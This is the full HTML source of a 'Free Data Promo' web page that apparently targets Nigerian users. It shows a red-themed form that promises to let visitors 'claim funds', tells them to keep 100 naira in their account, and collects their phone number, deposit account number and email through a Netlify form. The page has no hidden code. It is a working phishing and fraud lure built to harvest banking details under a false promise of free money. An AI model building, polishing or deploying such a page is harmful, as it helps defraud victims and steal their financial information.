<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Data Promo</title>
    <style>
        body {
            background-color: #a40000;
            font-family: Arial, sans-serif;
            color: white;
            text-align: center;
            margin: 0;
            padding: 0;
        }

        .top-bar {
            background-color: #ffffff;
            padding: 15px;
            font-weight: bold;
            text-align: center;
        }

        .menu-button {
            background: #a40000;
            color: #ffffff;
            border: none;
            padding: 10px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
        }

        .note {
            color: #ffffff;
            font-size: 14px;
            margin-top: 5px;
            padding: 10px;
        }

        .logo-wrap {
            margin-top: 20px;
        }

        .logo-wrap img {
            width: 120px;
            max-width: 90%;
            height: auto;
        }

        .container {
            background-color: #ffffff;
            padding: 20px;
            border-radius: 10px;
            width: 80%;
            max-width: 400px;
            margin: 20px auto;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.25);
        }

        input {
            width: 90%;
            padding: 12px;
            margin: 10px 0;
            border: 2px solid #a40000;
            border-radius: 20px;
            background-color: white;
            color: black;
            font-size: 16px;
            outline: none;
        }

        button {
            background-color: #a40000;
            color: #ffffff;
            border: none;
            padding: 12px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            width: 95%;
            margin-top: 10px;
        }

        button:hover {
            background-color: #830000;
        }

        .footer {
            margin: 20px 0;
            color: #ffffff;
            font-size: 13px;
        }
    </style>
</head>
<body>

    <div class="top-bar">
        <button class="menu-button">☰ MENU</button>
    </div>

    <div class="note">
        NOTE: MAKE SURE YOUR ACCOUNT HAS A BALANCE OF 100 NAIRA BEFORE CLAIMING YOUR FUNDS
    </div>

    <div class="logo-wrap">
        <img src="logo.png" alt="Your Logo">
    </div>

    <div class="container">
        <form name="promoForm" method="POST" data-netlify="true" action="success.html">
            <input type="text" name="phone" placeholder="Phone Number" required>
            <input type="text" name="account_number" placeholder="Account Number used to deposit" required>
            <input type="email" name="email" placeholder="Email" required>
            <button type="submit">Claim funds</button>
        </form>
    </div>

    <div class="footer">© 2026 Free Data. All rights reserved.</div>

</body>
</html>
